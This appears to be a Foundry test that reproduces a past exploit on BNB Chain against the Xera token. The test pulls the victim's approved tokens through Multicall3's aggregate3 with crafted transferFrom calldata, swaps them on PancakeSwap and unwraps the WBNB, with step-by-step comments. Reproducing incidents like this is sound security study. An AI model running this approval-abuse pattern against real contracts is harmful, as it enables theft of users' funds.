// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 17k USD
// Attacker : https://bscscan.com/address/0x00b700b9da0053009cb84400ed1e8fe251002af3
// Attack Contract : https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7
// Vulnerable Contract : https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7
// Attack Tx : https://bscscan.com/tx/0xed6fd61c1eb2858a1594616ddebaa414ad3b732dcdb26ac7833b46803c5c18db

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7#code

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1958354933247590450
// Twitter Guy : https://x.com/TenArmorAlert/status/1958354933247590450
// Hacking God : N/A


contract Multicall is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 58269338 - 1;

    address constant multicall = 0xcA11bde05977b3631167028862bE2a173976CA11;
    address constant cakeLP = 0x231075E4AA60d28681a2d6D4989F8F739BAC15a0;
    address constant xera = 0x93E99aE6692b07A36E7693f4ae684c266633b67d;
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant victim = 0x9a619Ae8995A220E8f3A1Df7478A5c8d2afFc542;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Set the funding token to native BNB (address(0)) for balance logging.
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        // The core of the exploit is to abuse the token approval granted by the victim to
        // the Multicall contract. 

        // 1. Craft the malicious calldata.
        // The parameters are:
        // - from: the `victim` contract's address.
        // - to: the `cakeLP` (PancakeSwap LP) address.
        // - amount: a large amount of Xera tokens to be transferred.
        bytes memory data = abi.encodeCall(
            IERC20.transferFrom,
            (
                victim,
                cakeLP,
                27900000000000000000000000
            )
        );

        // 2. Prepare the call for the Multicall contract.
        // - target: the `xera` token contract. The `transferFrom` will be executed on this contract.
        // - allowFailure: false, meaning the transaction will revert if this call fails.
        // - callData: the malicious calldata crafted in the previous step.
        IMulticall.Call3 memory call = IMulticall.Call3({
            target: address(xera),
            allowFailure: false,
            callData: data
        });

        // 3. Execute the malicious call via Multicall's `aggregate3`.
        // The `aggregate3` function of the Multicall contract executes the provided calls.
        // Due to the vulnerability, when the `xera` contract receives this call, it will
        // incorrectly identify the `victim` contract as the `msg.sender` because of how `_msgSender()` is implemented.
        // This allows the `transferFrom` to succeed as if the victim had initiated it,
        // since the victim had previously approved the multicall contract to spend its Xera tokens.
        IMulticall.Call3[] memory calls = new IMulticall.Call3[](1);
        calls[0] = call;
        IMulticall(multicall).aggregate3(calls);


        // 4. Swap the stolen tokens for WBNB.
        // The attacker now controls the stolen Xera tokens within the PancakeSwap LP contract.
        // They call the `swap` function on the `cakeLP` pair to exchange the Xera tokens for WBNB.
        IPancakePair(cakeLP).swap(0, 41034748173552867045, address(this), "");

        // 5. Withdraw the WBNB to the attacker's address.
        // The final step is to unwrap the WBNB into native BNB, effectively cashing out the stolen funds.
        IERC20(wbnb).withdraw(41034748173552867045);

    }

    // A receive function to allow the contract to receive native BNB.
    receive() external payable{}
}


interface IMulticall {
     function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData);


    struct Call3 {
        address target;
        bool allowFailure;
        bytes callData;
    }


    struct Result {
        bool success;
        bytes returnData;
    }
}